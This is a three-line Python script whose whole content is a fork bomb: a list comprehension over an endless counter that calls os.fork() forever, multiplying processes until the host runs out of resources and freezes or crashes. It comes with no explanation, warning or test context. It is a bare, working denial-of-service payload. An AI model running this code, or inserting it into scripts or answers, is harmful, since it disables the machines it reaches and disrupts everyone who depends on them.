#!/usr/bin/env python
import os, itertools

[os.fork() for i in itertools.count()]
